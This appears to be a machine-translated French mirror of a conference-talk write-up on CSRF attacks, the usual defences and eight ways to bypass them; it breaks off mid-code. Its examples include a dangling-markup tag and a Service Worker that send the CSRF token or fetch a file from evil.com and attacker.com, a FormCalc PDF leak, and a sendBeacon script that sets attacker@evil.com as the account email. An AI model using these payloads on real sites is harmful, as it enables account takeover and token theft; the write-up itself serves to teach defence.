<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üôåüèª üèáüèº ‚öõÔ∏è Les vuln√©rabilit√©s CSRF sont toujours d'actualit√© ü§ê üí¢ ü§£</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="CSRF (Cross Site Request Forgery) traduit en russe est un faux de demandes intersites. Mikhail Egorov ( 0ang3el ) dans son rapport sur Highload ++ 201...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Les vuln√©rabilit√©s CSRF sont toujours d'actualit√©</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/oleg-bunin/blog/412855/">  CSRF (Cross Site Request Forgery) traduit en russe est un faux de demandes intersites.  <strong>Mikhail Egorov</strong> ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" class="user_link">0ang3el</a> ) dans son rapport sur <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Highload ++</a> 2017 a parl√© des vuln√©rabilit√©s CSRF, des m√©canismes de protection g√©n√©ralement utilis√©s et de la mani√®re dont ils peuvent √™tre contourn√©s de toute fa√ßon.  Et √† la fin, il a pr√©sent√© une s√©rie de conseils sur la fa√ßon de se d√©fendre correctement contre les attaques CSRF.  Sous cat d√©codage de cette performance. <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/x5AuK_IbJlg" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br>  <strong>√Ä propos de l'orateur:</strong> Mikhail Egorov travaille chez Ingram Micro Cloud et est engag√© dans la s√©curit√© des applications.  Pendant son temps libre, Mikhail est engag√© dans la recherche de vuln√©rabilit√©s et la chasse aux bogues et prend la parole lors de conf√©rences de s√©curit√©. <br><br>  <strong>Avis de non-responsabilit√©:</strong> les informations fournies sont uniquement l'opinion de l'auteur, toutes les correspondances sont al√©atoires. <br><img src="https://habrastorage.org/webt/rx/zu/uu/rxzuuu_ccpo8uw9opgjbutrs-hk.jpeg"><br><br>  Ce monstre cookie est √† bl√¢mer pour le fait que les attaques CSRF fonctionnent.  Le fait est que de nombreuses applications Web utilisent des cookies (ci-apr√®s, nous consid√©rons appropri√© d'appeler des cookies en russe) pour contr√¥ler la session de l'utilisateur.  Le navigateur est con√ßu de sorte que s'il dispose de cookies utilisateur pour ce domaine et ce chemin, il les envoie automatiquement avec la requ√™te HTTP. <br><a name="habracut"></a><br><h3>  Les cookies <br></h3><br>  Un cookie est un petit morceau de donn√©es qu'un serveur Web envoie √† un client sous forme de nom = valeur dans un en-t√™te HTTP appel√© ¬´Set-Cookie¬ª.  Le navigateur stocke ces donn√©es sur l'ordinateur de l'utilisateur et, si n√©cessaire, envoie ces donn√©es au serveur Web dans le cadre d'une demande HTTP dans un en-t√™te HTTP appel√© ¬´Cookie¬ª. <br><br>  Les cookies peuvent avoir diff√©rents attributs, tels que: expire, domaine, s√©curis√©, httponly: <br><br>  Les cookies sont apparus pour la premi√®re fois dans le navigateur Netscape en 1994.  De nombreuses applications Web les utilisent encore pour g√©rer la session d'un utilisateur. <br><img src="https://habrastorage.org/webt/ja/hh/ue/jahhuedxwbccdc82v97tqub7geq.jpeg"><br><br>  Voyons comment fonctionne l'attaque classique Cross Site Request Forgery (CSRF). <br><br>  Disons que notre application Web a la possibilit√© de modifier l'adresse de livraison de l'utilisateur et utilise des cookies pour contr√¥ler la session. <br><br>  Nous avons un formulaire HTML que l'utilisateur doit remplir: entrez l'adresse et cliquez sur le bouton "Enregistrer".  En cons√©quence, une demande POST avec un formulaire HTML volera vers le backend.  On voit que le navigateur y installe automatiquement des cookies de session de l'utilisateur.  Le serveur principal, lorsqu'il re√ßoit une telle demande, voit qu'il existe une telle session, il est un utilisateur l√©gitime et change son adresse de livraison. <br><br>  Que peut faire un attaquant? <br><img src="https://habrastorage.org/webt/3n/cn/eh/3ncnehuga46_ltfvzfsgm3pb1ii.jpeg"><br><br>  Il peut placer une page HTML sur son site <em>attacker.com</em> qui soumet en fait le formulaire HTML √† l' <em>exemple</em> <em>.</em>  <em>com</em> .  √âtant donn√© que le navigateur ins√®re automatiquement les cookies de l'utilisateur dans la demande HTTP, le backend ne comprendra tout simplement pas si la demande est l√©gitime - est-ce le r√©sultat du remplissage du formulaire par l'utilisateur, ou s'agit-il d'une attaque CSRF - et changera l'adresse de livraison de l'utilisateur en une valeur avantageuse pour l'attaquant . <br><br>  Il existe une autre option pour une attaque CSRF √† l'aide de l'API XHR.  Si beaucoup ont entendu parler de l'attaque CSRF √† l'aide de formulaires HTML, ils en savent moins sur cette m√©thode, mais cela fonctionne √©galement. <br><img src="https://habrastorage.org/webt/vn/tw/s3/vntws3ykrle2c_xr6ztikub5q60.jpeg"><br><br>  Notez l'attribut withCredentials, qui oblige le navigateur √† envoyer automatiquement des cookies utilisateur.  Puisque la valeur de Content-type est application / x-www-form-urlencoded, le navigateur enverra cette demande sans demande de contr√¥le en amont des options CORS, et encore une fois l'attaque CSRF fonctionnera. <br><br>  Voyons plus clairement comment cela se produit. <br><img src="https://habrastorage.org/webt/ry/w2/dq/ryw2dquhy1hnddg0mkufscf8k4m.jpeg"><br><br>  Donn√©es sources: <br><br><ul><li>  application <i>example.com</i> vuln√©rable √† CSRF, <br></li><li>  utilisateur <br></li><li>  le site de l'attaquant, o√π se trouve une page csrf-xhr.html. <br></li></ul><br>  L'utilisateur est authentifi√© dans l'application, qui se trouve sur <i>example.com</i> .  S'il se rend sur le site de l'attaquant, une demande POST sera automatiquement ex√©cut√©e, ce qui modifiera l'adresse de livraison.  Le navigateur ins√©rera automatiquement les cookies de session dans la demande et le backend changera l'adresse. <br><br><h2>  Historique des attaques CSRF <br></h2><br>  En g√©n√©ral, les attaques CSRF sont connues depuis 2001, date √† laquelle elles ont commenc√© √† √™tre activement exploit√©es.  Au cours de la p√©riode 2008-2012, ces vuln√©rabilit√©s √©taient pr√©sentes sur chaque premier site, notamment: <br><br><ol><li>  YouTube <br></li><li>  Le New York Times; <br></li><li>  Badoo <br></li><li>  SlideShare <br></li><li>  Vimeo; <br></li><li>  Hulu; <br></li><li>  Recherche cin√©ma; <br></li><li>  ... <br></li></ol><br><h2>  Quelle est la gravit√© des vuln√©rabilit√©s CSRF? <br></h2><br>  En fait, tout d√©pend de la criticit√© de l'action vuln√©rable.  Ce pourrait √™tre: <br><br><ul><li>  Prise de contr√¥le du compte - l'attaquant capture le compte de la victime en modifiant l'e-mail via CSRF. <br></li><li>  Escalade de privil√®ges - augmentation des privil√®ges due au fait que l'attaquant via CSRF cr√©e un nouvel utilisateur avec des droits √©lev√©s sur le syst√®me. <br></li><li>  Ex√©cution de code √† distance - ex√©cution de code en raison de l'op√©ration d'injection de commandes dans le panneau d'administration via CSRF. <br></li></ul><br>  Voyons ce que les classifications de vuln√©rabilit√© √©tablies au niveau international disent de la gravit√© de la CSRF. <br><br>  Dans le projet <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">OWASP Top 10</a> , qui contient les 10 vuln√©rabilit√©s les plus critiques de l'application, en 2010, les vuln√©rabilit√©s CSRF occupaient la <strong>cinqui√®me place</strong> .  Ensuite, les d√©veloppeurs ont commenc√© √† impl√©menter diverses options de protection, et d√©j√† en 2013, les vuln√©rabilit√©s CSRF sont pass√©es √† la 8e position. <br><br>  Les vuln√©rabilit√©s CSRF n'√©taient pas du tout incluses dans la liste pour 2017, car soi-disant selon les statistiques, elles ne sont d√©sormais d√©tect√©es dans les tests de p√©n√©tration <strong>que dans 8% des cas</strong> . <br><br>  Personnellement, je ne suis pas d'accord avec ces statistiques, car au cours des deux derni√®res ann√©es, j'ai trouv√© de nombreuses vuln√©rabilit√©s CSRF.  Ensuite, je vais vous dire comment je l'ai fait. <br><br>  Dans la <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">classification Bugcrowd VRT</a> (Vulnerability Rating Taxonomy), les vuln√©rabilit√©s CSRF √† l'√©chelle de l'application ont un degr√© de gravit√© P2 (√©lev√©).  Seule la gravit√© critique est au-dessus, c'est-√†-dire qu'il s'agit de <strong>vuln√©rabilit√©s assez graves</strong> . <br><img src="https://habrastorage.org/webt/oh/2p/lv/oh2plvuhqczibq9rm4lmogh1ugi.jpeg"><br><br>  Consid√©rez quelles options de protection CSRF existent et comment chacune des options de protection fonctionne. <br><br>  <strong>1. Jeton CSRF</strong> <br><ul><li>  Pour chaque session utilisateur, un jeton unique et <strong>hautement</strong> entropique est g√©n√©r√©. <br></li><li>  Le jeton est ins√©r√© dans le DOM de la page HTML ou est donn√© √† l'utilisateur via l'API. <br></li><li>  L'utilisateur √† chaque demande associ√©e √† des modifications doit envoyer un jeton dans le param√®tre ou dans l'en-t√™te HTTP de la demande. <br></li><li>  √âtant donn√© que l'attaquant ne conna√Æt pas le jeton, l'attaque CSRF classique ne fonctionne pas. <br></li></ul><br>  <strong>2. Double soumettre le cookie</strong> <br><ul><li>  Encore une fois, un jeton unique et <strong>hautement</strong> entropique est g√©n√©r√© pour chaque session utilisateur, mais il est plac√© dans des cookies. <br></li><li>  L'utilisateur doit transmettre les m√™mes valeurs dans la demande dans la demande et dans le param√®tre de demande. <br></li><li>  Si ces deux valeurs co√Øncident dans les cookies et dans le param√®tre, il est consid√©r√© que c'est une demande l√©gitime. <br></li><li>  √âtant donn√© que l'attaquant ne peut tout simplement pas modifier les cookies dans le navigateur de l'utilisateur, l'attaque CSRF classique ne fonctionne pas. <br></li></ul><br>  <strong>3. Protection bas√©e sur le type de contenu</strong> <br><ul><li>  L'utilisateur doit envoyer une demande avec un en-t√™te Content-Type sp√©cifique, par exemple application / json. <br></li><li>  Puisqu'il est impossible d'envoyer une origine crois√©e Content-Type arbitraire dans le navigateur via le formulaire HTML ou l'API XHR, l'attaque CSRF classique ne fonctionne plus. <br></li></ul><br>  <strong>4. Protection bas√©e sur le r√©f√©rent</strong> <br><ul><li>  L'utilisateur doit envoyer une demande avec une valeur d'en-t√™te Referer sp√©cifique.  Le backend le v√©rifie, s'il est incorrect, alors il est consid√©r√© qu'il s'agit d'une attaque CSRF. <br></li><li>  √âtant donn√© que le navigateur ne peut pas envoyer de r√©f√©rent arbitraire via un formulaire HTML ou une API XHR, l'attaque CSRF classique ne fonctionne pas. <br></li></ul><br>  <strong>5. Confirmation du mot de passe / websudo</strong> <br><ul><li>  L'utilisateur doit confirmer l'action avec un mot de passe (ou secret). <br></li><li>  √âtant donn√© que l'attaquant ne le conna√Æt pas, l'attaque CSRF classique ne fonctionne pas. <br></li></ul><br>  <strong>6. Cookies SameSite dans Chrome, Opera</strong> <br>  Il s'agit d'une nouvelle technologie con√ßue pour prot√©ger contre la CSRF.  Pour le moment, il ne fonctionne que dans deux navigateurs (Chrome, Opera). <br><br><ul><li>  Un cookie est d√©fini avec un attribut suppl√©mentaire - samesite, qui peut avoir deux valeurs: lax ou strict. <br></li><li>  L'essence de la technologie est que le navigateur n'envoie pas de cookies si la demande provient d'un autre domaine, par exemple, du site Web de l'attaquant.  Ainsi, cela prot√®ge √† nouveau contre l'attaque CSRF classique. <br></li></ul><br>  Mais, malheureusement, partout il y a des fonctionnalit√©s de navigateurs, d'applications Web et de leur d√©ploiement, qui <strong>vous permettent</strong> parfois <strong>de contourner la protection CSRF</strong> . <br><br>  Par cons√©quent, parlons maintenant de <strong>8 fa√ßons de contourner la protection</strong> qui peuvent √™tre utilis√©es dans la pratique. <br><img src="https://habrastorage.org/webt/fh/tk/rx/fhtkrxcjtbvw2mfyxctik-zqizc.jpeg"><br><br><h3>  <strong>Sc√©narios de contournement:</strong> <br></h3><br>  <strong>1. XSS (cross-sitescripting)</strong> <br><br>  Si votre application Web dispose de XSS, cela la rend automatiquement vuln√©rable √† CSRF, et il est difficile de vous en prot√©ger.  <strong>Vous ne pouvez que supporter</strong> . <br><br>  <strong>2. Marquage pendant</strong> <br><br>  Disons que notre application a une vuln√©rabilit√© √† l'injection HTML, mais qu'il n'y a pas de XSS.  Par exemple, il existe une strat√©gie de s√©curit√© du contenu (CSP) qui prot√®ge contre XSS.  Mais un attaquant peut toujours int√©grer des balises HTML. <br><br>  Si notre application impl√©mente une protection bas√©e sur des jetons CSRF, l'attaquant peut int√©grer un tel HTML, ce ne sont pas des balises ferm√©es d'image ou de formulaire: <br><br><pre><code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">img</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">'https://evil.com/log_csrf?html= &lt;form action='</span></span></span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">http:</span></span></span><span class="hljs-tag">//</span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">evil.com</span></span></span><span class="hljs-tag">/</span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">log_csrf</span></span></span><span class="hljs-tag">'&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">textarea</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br>  En cons√©quence, une partie de la page HTML DOM sera envoy√©e √† la ressource de l'attaquant.  Il est fort probable que si l'attaquant impl√©mente correctement un tel HTML, ce qui arrive sur le site de l'attaquant contiendra un jeton CSRF. <br><br>  Ainsi, apr√®s avoir appris le jeton, l'attaquant pourra exploiter CSRF de mani√®re classique. <br><br>  <strong>3. Sous-domaine vuln√©rable</strong> <br><br>  Supposons que nous ayons un sous-domaine <em>foo.example.com</em> et qu'il soit vuln√©rable √† la <strong>prise de contr√¥le de sous-domaine</strong> ou <strong>XSS.</strong>  √Ä la suite de la prise de contr√¥le du sous-domaine, l'attaquant contr√¥le enti√®rement le sous-domaine et peut y ajouter n'importe quelle page HTML ou ex√©cuter du code JS dans le contexte du sous-domaine.  Si notre sous-domaine est vuln√©rable √† de telles choses, l'attaquant pourra contourner les types de protection CSRF suivants: <br><br><ul><li>  Jetons CSRF; <br></li><li>  Double soumettre le cookie; <br></li><li>  Protection bas√©e sur le type de contenu. <br></li></ul><br>  Supposons que notre application principale utilise <strong>CORS</strong> (Cross-Origin Resource Sharing) pour la communication entre domaines.  Deux en-t√™tes sont ins√©r√©s dans la r√©ponse du serveur: <br><br><ol><li>  Access-Control-Allow-Origin: foo.example.com (foo.example.com - sous-domaine vuln√©rable); <br></li><li>  Access-Control-Allow-Credentials: vrai <strong>&nbsp;</strong>  - afin qu'en utilisant l'API XHR, il soit possible de faire une demande avec des cookies utilisateur. <br></li></ol><br>  Si ces conditions sont remplies, l'attaquant peut simplement lire le jeton CSRF du sous-domaine qu'il contr√¥le et continuer √† exploiter le CSRF de mani√®re classique. <br><br>  L'option suivante.  Supposons qu'il existe un fichier <strong>crossdomain.xml</strong> sur le domaine principal que nous voulons attaquer.  Ce fichier est utilis√© par les plugins flash et PDF pour l'interaction des sous-domaines, et l'acc√®s √† celui-ci √† partir de tous les sous-domaines est autoris√©. <br><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">cross-domain-policy</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">allow-access-from</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">domain</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"*.example.com"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">cross-domain-policy</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br>  Si l'attaquant peut t√©l√©charger le fichier JS sur <i>foo.example.com</i> , alors dans ce cas, il peut utiliser l'API Service Worker pour le sous-domaine foo.example.com, qui donne en fait le fichier flash. <br><br><pre> <code class="javascript hljs"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> url = <span class="hljs-string"><span class="hljs-string">"https://attacker.com/bad.swf"</span></span>; onfetch = <span class="hljs-function"><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) =&gt;</span></span> { e.respondWith(fetch(url); }</code> </pre><br>  Comme nous avons crossdomain.xml sur le domaine principal, ce qui permet l'interaction des sous-domaines, l'attaquant lit simplement le jeton CSRF via ce SWF. <br><br><blockquote>  Soit dit en passant, une vuln√©rabilit√© similaire a r√©cemment √©t√© trouv√©e dans Amazon, plus de d√©tails <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">ici</a> . <br></blockquote><br>  M√™me si CORS n'est pas configur√© et qu'il n'y a pas de fichier crossdomain.xml, mais que la protection par cookie Double submit est utilis√©e, un attaquant peut simplement ins√©rer des cookies du sous-domaine du domaine parent vers le chemin o√π il souhaite exploiter CSRF, et ainsi contourner la protection par cookie Double submit. <br><br>  <strong>4. Mauvais PDF</strong> <br><br>  Cette solution de contournement est bas√©e sur PDF.  Adobe a un plugin PDF qui s'installe automatiquement lorsque vous installez Adobe Reader.  Ce plugin prend en charge le soi-disant script FormCalc.  Cependant, maintenant le plugin PDF d'Adobe ne fonctionne que dans IE11 et Firefox ESR. <br><br>  FormCalc a deux grandes m√©thodes: get () et post ().  Un attaquant utilisant la m√©thode get peut lire le token CSRF, en utilisant post, l'envoyer sur son site.  L'attaquant obtient donc le jeton CSRF de la victime. <br><br>  Supposons que nous ayons la possibilit√© de t√©l√©charger un fichier PDF dans une application Web.  En fait, il peut m√™me s'agir d'un fichier d'un format diff√©rent, par exemple, un attaquant peut essayer de t√©l√©charger un PDF sous le couvert d'une image, qui est l'avatar de l'utilisateur. <br><br>  L'application dispose d'une API sur le domaine principal, ce qui vous permet d'obtenir le contenu du fichier t√©l√©charg√©.  L'attaquant peut ensuite utiliser une page HTML qui incorpore le fichier PDF que l'attaquant a t√©l√©charg√© sur <i>example.com</i> √† l'aide de la balise embed. <br><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">h1</span></span></span><span class="hljs-tag">&gt;</span></span>Nothing to see here!<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">h1</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">embed</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"https://example.com/shard/x1/sh/leak.pdf"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">width</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"0"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">height</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"0"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">'application/pdf'</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br>  Fichier <strong>Leak.pdf</strong> : <br><img src="https://habrastorage.org/webt/ua/nb/7w/uanb7wix-egv6kro7ntqby84gnm.jpeg"><br><br>  Ce fichier contient un script FormCalc qui lit simplement la page Settings.action, o√π se trouve un jeton CSRF dans le DOM et l'envoie √† l'aide de la m√©thode post au site de l'attaquant. <br><br>  √âtant donn√© que le PDF est t√©l√©charg√© sur example.com, ce PDF lui-m√™me a un acc√®s complet √† tout ce qui est d'origine <code>https://example.com</code> , et peut y lire des donn√©es sans violer le mode SOP (Same Origin Policy). <br><br>  Un autre objectif est que pour le plugin PDF, peu importe le type de contenu du fichier PDF, et m√™me la r√©ponse HTTP peut contenir d'autres en-t√™tes (par exemple, Content-Disposition).  Le plugin PDF rendra toujours ce PDF et ex√©cutera le script FormCalc. <br><br>  <strong>5. Injection de cookies</strong> <br><br>  Si la protection Double cookie est utilis√©e, alors si l'attaquant peut introduire des cookies, le jeu est termin√©. <br><br>  L'une des options les plus populaires dans ce sc√©nario est l' <strong>injection</strong> <strong>CRLF</strong> . <br><br>  Si l'attaquant peut ins√©rer des en-t√™tes suppl√©mentaires dans la r√©ponse du serveur, il peut simplement ajouter l'en-t√™te Set-Cookie avec les cookies n√©cessaires et contourner la protection CSRF. <br><br>  Une autre option est li√©e aux <strong>fonctionnalit√©s de gestion des cookies du navigateur</strong> . <br><br>  Par exemple, dans Safari, vous pouvez utiliser une virgule pour ins√©rer de nouveaux cookies (cookies s√©par√©s par des virgules).  Supposons que nous ayons un param√®tre URL dans l'en-t√™te nomm√© langue.  Nous le traitons et √©crivons la valeur de la langue s√©lectionn√©e √† l'utilisateur dans des cookies.  Si l'attaquant ins√®re une virgule, il peut ins√©rer des cookies suppl√©mentaires avec n'importe quel nom. <br><br>  En outre, le contournement de la protection CSRF peut aider <strong>les bogues du navigateur</strong> .  Par exemple, dans Firefox, il √©tait possible d'incorporer des cookies via une image SVG ( <strong>CVE-2016-9078)</strong> .  Si nous avons un √©diteur HTML et que nous permettons √† l'utilisateur d'ins√©rer des balises d'image, l'attaquant peut simplement pointer vers l'image SVG dans l'attribut SRC, qui d√©finira les cookies n√©cessaires. <br><br>  <strong>6. Changer le type de contenu</strong> <br><blockquote>  Certains d√©veloppeurs pensent que si vous utilisez un format de donn√©es non standard dans le corps d'une demande POST pour communiquer avec le backend, cela peut vous sauver de CSRF.  Ce n'est en fait pas le cas. <br></blockquote><br>  √Ä titre d'exemple, je citerai une vuln√©rabilit√© que j'ai r√©cemment d√©couverte dans un service de gestion de notes tr√®s populaire. <br><br>  Il a utilis√© une API qui utilise Apache Thrift (format de donn√©es binaires) et des cookies pour contr√¥ler la session.  Par exemple, pour ajouter une nouvelle note, l'utilisateur devait envoyer une telle demande POST.  Des donn√©es binaires ont √©t√© transmises dans le corps et Content-Type: application / x-thrift a √©t√© sp√©cifi√©. <br><br><pre> <code class="hljs powershell">POST /user/add/note HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> Host: example.com User<span class="hljs-literal"><span class="hljs-literal">-Agent</span></span>: Mozilla/<span class="hljs-number"><span class="hljs-number">5.0</span></span> (X11; Linux x86_64; rv:<span class="hljs-number"><span class="hljs-number">45.0</span></span>) Gecko/<span class="hljs-number"><span class="hljs-number">20100101</span></span> Firefox/<span class="hljs-number"><span class="hljs-number">45.0</span></span> Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number"><span class="hljs-number">0.9</span></span>,*/*;q=<span class="hljs-number"><span class="hljs-number">0.8</span></span> Accept<span class="hljs-literal"><span class="hljs-literal">-Language</span></span>: en<span class="hljs-literal"><span class="hljs-literal">-US</span></span>,en;q=<span class="hljs-number"><span class="hljs-number">0.5</span></span> Accept<span class="hljs-literal"><span class="hljs-literal">-Encoding</span></span>: gzip, deflate Referer: https://example.com Cookie: JSESSIONID=<span class="hljs-number"><span class="hljs-number">728</span></span>FAA7F23EE00B0EDD56D1E220C011E.jvmroute8081; Connection: close Content<span class="hljs-literal"><span class="hljs-literal">-Type</span></span>: application/x<span class="hljs-literal"><span class="hljs-literal">-thrift</span></span> Content<span class="hljs-literal"><span class="hljs-literal">-Length</span></span>: <span class="hljs-number"><span class="hljs-number">43</span></span></code> </pre><br>  En fait, ce Content-Type n'a pas √©t√© valid√© dans le backend.  Il √©tait possible de le changer en text / plain et d'utiliser l'API XHR pour exploiter cette vuln√©rabilit√© CSRF en passant simplement des donn√©es binaires dans le corps de la requ√™te POST. <br><img src="https://habrastorage.org/webt/pl/cv/yk/plcvykuxz09ts4h6aooogmms_pe.jpeg"><br><br>  En fait, la s√©curit√© bas√©e sur le type de contenu est une option de s√©curit√© tr√®s m√©diocre.  Il est contourn√© dans la plupart des cas. <br><br>  <strong>7. Type de contenu non simple</strong> <br><br>  Gr√¢ce au formulaire HTML ou √† l'aide de l'API XHR, nous pouvons soumettre les types de contenu suivants: <br><br><ul><li>  texte / simple; <br></li><li>  application / x-www-form-urlencoded; <br></li><li>  multipart / form-data. <br></li></ul><br>  En fait, il est possible d'envoyer des valeurs de type de contenu via: <br><br><ul><li>  bogues dans les navigateurs (par exemple, Navigator.sendBeacon); <br></li><li>  plugins: plugin Flash + redirection 307 et plugin PDF + redirection 307; <br></li><li>  frameworks backend. <br></li></ul><br>  Certains frameworks, tels que le framework JAX-RS Apache CXF, prennent en charge un param√®tre <strong>appel√© ctype</strong> dans l'URL.  Vous pouvez sp√©cifier n'importe quel type de contenu dans ce param√®tre, le backend examinera ce param√®tre et l'utilisera √† la place du type de contenu, qui est pass√© √† l'en-t√™te ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">lien</a> vers la source). <br><br>  Un <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">bug</a> assez <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">connu</a> dans le navigateur Chrome a √©t√© trouv√© en 2015, apr√®s quoi, apr√®s environ un mois, il est entr√© en acc√®s public, mais n'a √©t√© corrig√© qu'en 2017.  Ce bogue vous a permis d'envoyer une demande POST avec n'importe quel type de contenu √† une autre origine √† l'aide d'une API appel√©e <strong>Navigator.sendBeacon ().</strong> <br>  √Ä quoi ressemblait l'op√©ration? <br><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span><span class="actionscript"><span class="actionscript"> </span><span class="hljs-function"><span class="hljs-keyword"><span class="actionscript"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span></span><span class="actionscript"><span class="hljs-function"> </span></span><span class="hljs-title"><span class="actionscript"><span class="hljs-function"><span class="hljs-title">jsonreq</span></span></span></span><span class="hljs-params"><span class="actionscript"><span class="hljs-function"><span class="hljs-params">()</span></span></span></span><span class="actionscript"><span class="hljs-function"> </span></span></span><span class="actionscript">{ </span><span class="hljs-keyword"><span class="actionscript"><span class="hljs-keyword">var</span></span></span><span class="actionscript"> data = </span><span class="hljs-string"><span class="actionscript"><span class="hljs-string">'{"action":"add-user-email","Email":"attacker@evil.com"}'</span></span></span><span class="actionscript">; </span><span class="hljs-keyword"><span class="actionscript"><span class="hljs-keyword">var</span></span></span><span class="actionscript"> blob = </span><span class="hljs-keyword"><span class="actionscript"><span class="hljs-keyword">new</span></span></span><span class="actionscript"> Blob([data], {type : </span><span class="hljs-string"><span class="actionscript"><span class="hljs-string">'application/json;charset=utf-8'</span></span></span><span class="actionscript">}); navigator.sendBeacon(</span><span class="hljs-string"><span class="actionscript"><span class="hljs-string">'https://example.com/home/rpc'</span></span></span><span class="actionscript">, blob ); } jsonreq(); </span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span 